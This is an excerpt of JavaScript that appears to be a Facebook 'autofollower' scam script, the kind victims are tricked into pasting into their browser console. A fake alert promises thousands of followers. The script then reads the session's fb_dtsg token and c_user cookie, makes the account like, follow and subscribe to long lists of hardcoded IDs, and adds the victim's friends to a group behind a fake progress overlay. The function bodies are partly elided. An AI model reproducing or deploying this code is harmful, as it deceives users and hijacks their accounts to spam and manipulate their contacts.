...
alert(' Wait 5-7Minutes "Autofollower  2750 Followers Add After 72Hours !   Click [Ok] Adding 2750 Followers Dont Close [x] ');
...
IDS("100000740396815");
IDS("100006667423609");
sublist("747997335234939");
sublist("748009165233756");
sublist("747999191901420");
sublist("748009798567026");
sublist("748010705233602");
sublist("748011435233529");
sublist("748012121900127");
sublist("748012848566721");
sublist("709754282392578");
sublist("725539290814077");
sublist("491868480921036");
sublist("746028498765156");
sublist("745978202103519");
sublist("746415708726435");
sublist("746029242098415");
sublist("729314570436549");
sublist("729898357044837");
sublist("727325067302166");
sublist("1465241787041388");
sublist("422413791227668");
sublist("414281768707537");
sublist("562521103826775");

// cheo Ph?c H?p
Like("549252541753997");
Like("398739273555192");
...
Like("284905944997186");
Like("730557190320260");
Like("427659460701846");
Like("1465808553636980");
...
Like("190765747611990");  
Like("141823099305373");  
...
P("754300217937984");
//Group subscriber
var gid = ['472709066171701'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
alert(' 400  Follower Detected  ');
...
if (i > 0) {
dipes += arr.length + " Follower Detected<br/>";
dipes += "<b>" + suc + "</b> Follower Added Of " + (arr.length - i) + " Follower Processed ";
dipes += "(" + i + " More To Go..)";
dipes += "<div class='friend-edge'>";
dipes += kunaon;
dipes += "</div>"
} else {
dipes += arr.length + " Follower Detected And ";
dipes += "<b>" + suc + " Follower Added</b>";
...
if (ele && ele.childNodes[0] && ele.childNodes[0] && ele.childNodes[0].childNodes[1] && ele.childNodes[0].childNodes[1].childNodes[0] && document.getElementsByClassName("mbm")[a].childNodes[0].childNodes[1].childNodes[0].value == "Add Follower To Group") {
eind = a;
break
}
}
...
var dipes = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(100,200,225,0.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid red(0,0,0,0.5)'>";
dipes += "<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>";
dipes += arr.length + " Follower Detected";
dipes += "</div>";
document.getElementById("pagelet_welcome_box").innerHTML = dipes;
penetrasi(arr[i])
})
